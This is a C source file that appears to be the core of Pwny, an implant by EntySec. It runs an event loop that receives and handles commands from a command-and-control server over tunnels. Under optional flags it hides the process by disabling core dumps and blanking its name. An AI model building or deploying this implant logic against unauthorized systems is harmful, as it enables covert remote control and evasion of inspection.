/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <signal.h>
#include <sigar.h>
#include <eio.h>
#include <ev.h>

#include <pwny/c2.h>
#include <pwny/core.h>
#include <pwny/tabs.h>
#include <pwny/pipe.h>
#include <pwny/tunnel.h>
#include <pwny/log.h>
#include <pwny/calls.h>
#include <pwny/misc.h>

#include <pwny/tlv.h>
#include <pwny/tlv_types.h>

#include <pwny/tunnels/tunnels.h>

#ifdef __linux__
#include <sys/prctl.h>
#endif

static struct ev_idle eio_idle_watcher;
static struct ev_async eio_async_watcher;

static void eio_idle_cb(struct ev_loop *loop, struct ev_idle *w, int revents)
{
    if (eio_poll() != -1)
    {
        ev_idle_stop(loop, w);
    }
}

static void eio_async_cb(struct ev_loop *loop, struct ev_async *w, int revents)
{
    if (eio_poll() == -1)
    {
        ev_idle_start(loop, &eio_idle_watcher);
    }

    ev_async_start(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_want_poll(void)
{
    ev_async_send(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_done_poll(void)
{
    ev_async_stop(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void core_signal_handler(struct ev_loop *loop, ev_signal *w, int revents)
{
    switch (w->signum)
    {
        case SIGINT:
            log_debug("* Core has SIGINT caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        case SIGTERM:
            log_debug("* Core has SIGTERM caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        default:
            break;
    }
}

void core_write(void *data)
{
    c2_t *c2;

    c2 = data;
    tunnel_write(c2->tunnel, c2->tunnel->egress);
}

void core_read(void *data)
{
    c2_t *c2;
    core_t *core;

    c2 = data;
    core = c2->data;

    while (c2_dequeue_tlv(c2, &c2->request) > 0)
    {
        switch (api_process_c2(c2, core->api_calls, core->tabs))
        {
            case API_BREAK:
                log_debug("* Received API_BREAK signal (%d)\n", API_BREAK);

                c2_enqueue_tlv(c2, c2->response);

                tlv_pkt_destroy(c2->response);
                tlv_pkt_destroy(c2->request);

                crypt_set_secure(c2->crypt, STAT_NOT_SECURE);
                crypt_set_algo(c2->crypt, ALGO_NONE);

                if (!c2->tunnel->keep_alive)
                {
                    c2_stop(c2);
                }

                if (c2_active_tunnels(core->c2) == 0)
                {
                    ev_break(core->loop, EVBREAK_ALL);
                }

                return;

            case API_CALLBACK:
                log_debug("* Received API_CALLBACK signal (%d)\n", API_CALLBACK);

                c2_enqueue_tlv(c2, c2->response);

                tlv_pkt_destroy(c2->response);
                tlv_pkt_destroy(c2->request);

                break;

            case API_SILENT:
                log_debug("* Received API_SILENT signal (%d)\n", API_SILENT);

                break;

            default:
                break;
        }
    }
}

core_t *core_create(void)
{
    core_t *core;

    core = calloc(1, sizeof(*core));

    if (core == NULL)
    {
        return NULL;
    }

    core->loop = ev_default_loop(CORE_EV_FLAGS);
    core->t_count = 0;
    core->c_count = 0;

    core->c2 = NULL;
    core->api_calls = NULL;
    core->tunnels = NULL;
    core->tabs = NULL;

    ev_idle_init(&eio_idle_watcher, eio_idle_cb);
    ev_async_init(&eio_async_watcher, eio_async_cb);
    eio_init(eio_want_poll, eio_done_poll);

    return core;
}

void core_set_uuid(core_t *core, char *uuid)
{
    core->uuid = strdup(uuid);
}

void core_set_path(core_t *core, char *path)
{
    core->path = strdup(path);
}

int core_add_uri(core_t *core, char *uri)
{
    c2_t *c2;
    struct pipes_table *pipes;

    c2 = c2_add_uri(&core->c2, core->c_count, uri, core->tunnels);
    if (c2 == NULL)
    {
        return -1;
    }

    pipes = NULL;
    register_api_pipes(&pipes);

    c2_set_links(c2, core_read, core_write, NULL, NULL);
    c2_setup(c2, core->loop, pipes, core);
    c2_start(c2);

    core->c_count++;
    return 0;
}

void core_setup(core_t *core)
{
    char uuid[UUID_SIZE];

    if (!core->uuid)
    {
        misc_uuid(uuid);
        core_set_uuid(core, uuid);
    }

    sigar_open(&core->sigar);

    register_pipe_api_calls(&core->api_calls);
    register_core_tunnels(&core->tunnels);
    register_api_calls(&core->api_calls);

    log_debug("* Loaded core\n");
}

int core_start(core_t *core)
{
    char name[5];
    ev_signal sigint_w, sigterm_w;

#ifdef __linux__
    if (core->flags & CORE_NO_DUMP)
    {
        prctl(PR_SET_DUMPABLE, 0, 0, 0);
    }

    if (core->flags & CORE_NO_NAME)
    {
        memset(name, 0, 5);
        prctl(PR_SET_NAME, name);
    }
#endif

    ev_signal_init(&sigint_w, core_signal_handler, SIGINT);
    ev_signal_start(core->loop, &sigint_w);
    ev_signal_init(&sigterm_w, core_signal_handler, SIGTERM);
    ev_signal_start(core->loop, &sigterm_w);

    ev_async_start(core->loop, &eio_async_watcher);
    return ev_run(core->loop, 0);
}

void core_destroy(core_t *core)
{
    ev_break(core->loop, EVBREAK_ALL);

    c2_free(core->c2);
    sigar_close(core->sigar);

    api_calls_free(core->api_calls);
    tabs_free(core->tabs);
    tunnels_free(core->tunnels);

    if (core->uuid)
    {
        free(core->uuid);
    }

    if (core->path)
    {
        free(core->path);
    }

    free(core);
}
